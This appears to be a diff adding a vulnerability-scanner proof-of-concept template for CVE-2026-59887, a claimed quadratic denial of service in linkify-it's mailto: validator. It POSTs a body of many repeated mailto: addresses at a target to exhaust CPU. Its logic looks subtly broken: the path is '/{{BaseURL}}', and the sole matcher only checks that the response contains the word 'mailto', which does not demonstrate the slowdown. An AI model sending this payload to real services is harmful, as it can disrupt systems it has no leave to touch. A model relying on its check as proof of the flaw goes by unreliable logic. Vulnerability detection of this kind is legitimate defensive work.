@@ -1,0 +1,32 @@
+[info]
+author = "ave"
+description = "检测 linkify-it mailto: 模式验证器的二次复杂度拒绝服务漏洞。发送包含大量 mailto: 重复字符串的请求，触发 text.slice(pos) O(n) 复制与贪婪正则 O(n) 扫描导致的 O(n²) CPU 消耗，阻塞单线程事件循环。影响 linkify-it < 5.0.2。"
+id = "POC-AVE-2026-0854"
+name = "CVE-2026-59887 PoC"
+severity = "high"
+tags = ["ave-2026-0854"]
+vuln_id = [
+    "CVE-2026-59887",
+    "AVE-2026-0854",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}"
+protocol = "http"
+
+[poc.requests.body]
+content = "mailto:a@b.com mailto:c@d.com mailto:e@f.com mailto:g@h.com mailto:i@j.com mailto:k@l.com mailto:m@n.com mailto:o@p.com mailto:q@r.com mailto:s@t.com mailto:u@v.com mailto:w@x.com mailto:y@z.com mailto:a1@b.com mailto:c1@d.com mailto:e1@f.com mailto:g1@h.com mailto:i1@j.com mailto:k1@l.com mailto:m1@n.com mailto:o1@p.com mailto:q1@r.com mailto:s1@t.com mailto:u1@v.com mailto:w1@x.com mailto:y1@z.com mailto:a2@b.com mailto:c2@d.com mailto:e2@f.com mailto:g2@h.com mailto:i2@j.com mailto:k2@l.com mailto:m2@n.com mailto:o2@p.com mailto:q2@r.com mailto:s2@t.com mailto:u2@v.com mailto:w2@x.com mailto:y2@z.com mailto:a3@b.com mailto:c3@d.com mailto:e3@f.com mailto:g3@h.com mailto:i3@j.com mailto:k3@l.com mailto:m3@n.com mailto:o3@p.com mailto:q3@r.com mailto:s3@t.com mailto:u3@v.com mailto:w3@x.com mailto:y3@z.com mailto:a4@b.com mailto:c4@d.com mailto:e4@f.com mailto:g4@h.com mailto:i4@j.com mailto:k4@l.com mailto:m4@n.com mailto:o4@p.com mailto:q4@r.com mailto:s4@t.com mailto:u4@v.com mailto:w4@x.com mailto:y4@z.com mailto:a5@b.com mailto:c5@d.com mailto:e5@f.com mailto:g5@h.com mailto:i5@j.com mailto:k5@l.com mailto:m5@n.com mailto:o5@p.com mailto:q5@r.com mailto:s5@t.com mailto:u5@v.com mailto:w5@x.com mailto:y5@z.com"
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "text/plain"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["mailto"]
